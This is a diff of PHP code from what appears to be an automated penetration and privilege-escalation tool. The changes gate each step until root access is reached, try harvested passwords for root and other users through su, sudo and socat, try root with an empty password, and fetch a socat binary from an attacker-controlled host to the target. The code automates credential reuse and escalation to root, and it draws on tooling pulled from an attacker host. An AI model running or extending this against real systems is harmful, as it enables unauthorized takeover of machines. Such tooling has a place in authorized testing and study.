@@ -257,9 +257,9 @@ lxc launch SomeAlias MyMachine
         $ssh_ports = $this->ip2ports4service("ssh");
         foreach ($ssh_ports as $ssh_port){
             if (empty($ssh_port)) $ssh_port = "22" ;
-            $this->misc2user8pass8local($stream,$user2name, $user2pass,$ssh_port);        
-            $this->misc2user8pass8remote($stream,$user2name, $user2pass,$ssh_port);
-            $this->users2user($stream,$user2name, $user2pass);
+            if (!$this->ip2root8db($this->ip2id)) $this->misc2user8pass8local($stream,$user2name, $user2pass,$ssh_port);        
+            if (!$this->ip2root8db($this->ip2id)) $this->misc2user8pass8remote($stream,$user2name, $user2pass,$ssh_port);
+            if (!$this->ip2root8db($this->ip2id)) $this->users2user($stream,$user2name, $user2pass);
             
         }
     }
@@ -685,18 +685,11 @@ If /etc/exports if writable, you can add an NFS entry or change and existing ent
     
     public function users($stream){
         $this->titre(__FUNCTION__);
-        $template_id_euid = "sudo bash -c '%ID%' ";
-        $this->pentest8id($stream,$template_id_euid);
-        $template_id_euid = "sudo su -c '%ID%' ";
-        $this->pentest8id($stream,$template_id_euid);
         
-        $users_passwd = $this->ip2users4passwd();
-        
+        $users_passwd = $this->ip2users4passwd();        
         foreach ($users_passwd as $user2name => $user2pass){
             if (!empty($user2name)) {
-                if (!$this->ip2root8db($this->ip2id)) $this->users2sudoers8filepath($stream,$this->users2sudoers2list($stream,$user2name, $user2pass));
-                
-
+                if (!$this->ip2root8db($this->ip2id)) $this->users2sudoers8filepath($stream,$this->users2sudoers2list($stream,$user2name, $user2pass));               
             }
         }
         $this->pause();
@@ -707,8 +700,13 @@ If /etc/exports if writable, you can add an NFS entry or change and existing ent
                 if (!$this->ip2root8db($this->ip2id)) $this->users2sudoers8filepath($stream,$this->users2sudoers2list($stream,$user2name_shell, ""));
             }
         
-        $this->users4user($stream);
-        $this->users4pass($stream);        
+        if (!$this->ip2root8db($this->ip2id))  $this->users4user($stream);
+        if (!$this->ip2root8db($this->ip2id)) $this->users4pass($stream);  
+        
+        $template_id_euid = "sudo bash -c '%ID%' ";
+        if (!$this->ip2root8db($this->ip2id)) $this->pentest8id($stream,$template_id_euid);
+        $template_id_euid = "sudo su -c '%ID%' ";
+        if (!$this->ip2root8db($this->ip2id)) $this->pentest8id($stream,$template_id_euid);
     }
     
     
@@ -762,14 +760,16 @@ If /etc/exports if writable, you can add an NFS entry or change and existing ent
     public function users4user($stream){
         $this->ssTitre(__FUNCTION__);
 
-        
-                $users_passwd = $this->ip2users4passwd();
+        $users_passwd = $this->ip2users4passwd();
         foreach ($users_passwd as $user2name => $user2pass){
             if (!empty($user2name)) {
-                if (!empty($user2pass) && !$this->ip2root8db($this->ip2id) ) $this->users2user($stream,$user2name,$user2pass);
+                if (!empty($user2pass) && !$this->ip2root8db($this->ip2id) ) {
+                    if (!$this->ip2root8db($this->ip2id)) $this->users2user($stream,$user2name,$user2pass);
+                    if (!$this->ip2root8db($this->ip2id)) $this->users2user($stream,"root",$user2pass);                    
+                }
             }
         }
-        
+        if (!$this->ip2root8db($this->ip2id)) $this->users2user($stream,"root","");
     }
     
     
@@ -778,14 +778,19 @@ If /etc/exports if writable, you can add an NFS entry or change and existing ent
         $this->ssTitre(__FUNCTION__);
         $user_name = trim($user_name);
         $user_pass = trim($user_pass);
-        $template_id_euid = "sudo su -c '%ID%' ";
-        $this->pentest8id($stream,$template_id_euid);
-        $template_id_euid = "( sleep $this->stream_timeout ;echo $user_pass; sleep 5;) |  socat - EXEC:\"su $user_name -c '%ID%'\",pty,stderr,setsid,sigint,ctty,sane";
+        
+        $ip_attacker = $this->ip4addr4target($this->ip);
+        $filename = "socat";
+        $path_remotebin_socat = $this->bin2path($stream,$filename,$ip_attacker);
+
+        $template_id_euid = "( sleep $this->stream_timeout ;echo $user_pass; sleep 5;) |  $path_remotebin_socat - EXEC:\"su $user_name -c '%ID%'\",pty,stderr,setsid,sigint,ctty,sane";
         $this->pentest8id($stream,$template_id_euid);
         $template_id_euid = "(sleep 1;echo '$user_pass';sleep 1;) |  su $user_name -c '%ID%'  ";
         $this->pentest8id($stream,$template_id_euid);
         $template_id_euid = "echo '$user_pass' | sudo -S su $user_name -c '%ID%'  ";
         $this->pentest8id($stream,$template_id_euid);
+
+        
         
 
    
